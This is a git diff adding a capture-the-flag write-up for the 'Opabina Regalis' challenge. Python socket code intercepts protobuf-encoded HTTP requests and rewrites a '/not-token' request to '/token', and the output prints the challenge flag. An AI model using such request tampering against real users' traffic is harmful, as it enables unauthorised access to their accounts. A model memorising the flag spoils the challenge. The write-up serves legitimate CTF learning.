@@ -9,7 +9,7 @@
 >
 >There are a variety of client side machines that have access to certain websites we'd like to access. We have a system in place, called "Opabina Regalis" where we can intercept and modify HTTP requests on the fly. Can you implement some attacks to gain access to those websites?
 >
->Opabina Regalis makes use of Protocol Buffers to send a short snippet of the HTTP request for modification.
+>Opabina Regalis makes use of [Protocol Buffers](https://developers.google.com/protocol-buffers/) to send a short snippet of the HTTP request for modification.
 >
 >Here's the protocol buffer definition used:
 >
@@ -56,5 +56,109 @@
 
 ## Write-up
 
-(TODO)
+In order to solve this problem, I had to learn a little bit about Protocol buffer.  I started by reading the documentation that was linked in the challenge description.  It looks like Google supports a few different languages, so I decided to go with Python.  But first I had to install the protocol buffer compiler (protoc).
 
+
+Download the protocl buffer project
+```
+$ git clone https://github.com/google/protobuf.git
+```
+
+
+Compile and install (from [Google's Git Documentaion](https://github.com/google/protobuf/tree/master/src))
+```
+$ cd ./protobuf/
+$ ./autogen.sh
+$ ./configure
+$ make
+$ make check
+$ sudo make install
+$ sudo ldconfig # refresh shared library cache.
+```
+
+Google has provided the contents of our message file in the challenge description, simply save it as main.proto.
+
+Now that the protocol buffer compiler has been installed and we have our main.proto file created, it is time to run the compiler.
+```
+$ protoc -I=./ --python_out=./ main.proto
+```
+
+Wow, I am finally ready to start writing code.  I can create an empty Exchange message protocol buffer with the following snippet:
+```python
+import main_pb2
+msg = main_pb2.Exchange()
+```
+
+Once I verified that I could import main_pb2, I setup the TCP/SSL socket as such:
+```python
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_SSLv23)
+```
+
+This is the code I wrote for reading from the socket, careful to obey the requirement for 32bit little-endian integers.
+```python
+def rx_msg(sock):
+  data = sock.recv(4)
+  
+  #Unpack the message length
+  msg_len = struct.unpack('<I', data)[0]
+  data = sock.recv(msg_len)
+  
+  #Read the protocol buffer message
+  msg = main_pb2.Exchange()
+  msg.ParseFromString(data)
+```
+
+And the code for writing to the socket.
+```python
+def tx_msg(sock, msg):
+  p = pack_msg(msg.SerializeToString())
+  sock.send(p)
+```
+
+And add some simple code to print the request so that I can easily see what is happening.
+```python
+def print_req(req):
+  print('VerbType: ' + repr(req.ver))
+  print('URI: ' + repr(req.uri))
+  print('Headers:')
+  for i in req.headers:
+  	print(repr(i))
+  print('Body: ' + repr(req.body))
+```
+
+I should be all set, let's connect to the socket and see if I get a request.
+```
+VerbType: 0
+URI: u'/not-token'
+Headers:
+key: "User-Agent"
+value: "opabina-regalis.go"
+```
+
+Hmm...  Looks like someone is trying to connect to '/not-token'.  What if I create a new request for '/token'
+```python
+new_dat = main_pb2.Exchange()
+new_dat.request.ver = main_pb2.Exchange.GET
+new_dat.request.uri = u'/token'
+new_dat.request.body = ''
+tx_msg(ws, new_dat)
+```
+
+Now let's see what the whole script output looks like.
+```
+VerbType: 0
+URI: u'/not-token'
+Headers:
+key: "User-Agent"
+value: "opabina-regalis.go"
+
+Body: ''
+Status: 200
+Headers:
+key: "Server"
+value: "opabina-regalis.go"
+
+Body: 'CTF{WhyDidTheTomatoBlush...ItSawTheSaladDressing}'
+```
